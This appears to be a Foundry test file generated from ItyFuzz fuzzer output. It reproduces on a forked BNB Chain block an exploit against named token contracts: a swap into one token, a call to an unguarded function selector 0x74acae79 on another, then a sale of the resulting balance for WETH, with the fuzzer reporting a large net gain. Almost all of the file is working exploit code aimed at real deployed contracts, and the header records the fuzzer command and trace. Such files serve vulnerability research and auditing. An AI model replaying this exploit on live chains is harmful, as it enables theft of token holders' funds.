// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x1e813fa05739bf145c1f182cb950da7af046778d,0x1E813fA05739Bf145c1F182CB950dA7af046778d,0x2ecD8Ce228D534D8740617673F31b7541f6A0099,0xcfb7909b7eb27b71fdc482a2883049351a1749d7 -c bsc --onchain-block-number 19852596 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Earned 822608692764741485000000 more than owed 1099511627776000000, net earned = 822607593253113709000000wei (0ETH)

================ Trace ================
[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   └─[1] Router.swapExactETHForTokens{value: 1099511627776}(0, path:(WETH → 0x1E813fA05739Bf145c1F182CB950dA7af046778d), address(this), block.timestamp);
[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   ├─[1] 0xCfb7909B7EB27b71fDC482A2883049351a1749d7.call(0x74acae79)
   └─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0xCfb7909B7EB27b71fDC482A2883049351a1749d7 → WETH), address(this), block.timestamp);


 */

contract C1e81 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 19852596);
    }

    function test() public {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        address[] memory path0 = new address[](2);
        path0[0] = weth;
        path0[1] = 0x1E813fA05739Bf145c1F182CB950dA7af046778d;
        vm.deal(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, 1099511627776);
        IUniswapV2Router(router).swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: 1099511627776
        }(0, path0, address(this), block.timestamp);
        
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        
        0xCfb7909B7EB27b71fDC482A2883049351a1749d7.call(abi.encodeWithSignature(
            "74acae79()"
        )); 
        vm.startPrank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        uint256 amount0 = IERC20(0xCfb7909B7EB27b71fDC482A2883049351a1749d7).balanceOf(address(this));
        IERC20(0xCfb7909B7EB27b71fDC482A2883049351a1749d7).approve(router, amount0);
        address[] memory liq_path0 = new address[](2);
        liq_path0[0] = 0xCfb7909B7EB27b71fDC482A2883049351a1749d7;
        liq_path0[1] = address(weth);
        vm.deal(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, amount0);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount0, 0, liq_path0, address(this), block.timestamp
        );
        vm.stopPrank();
    }

}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
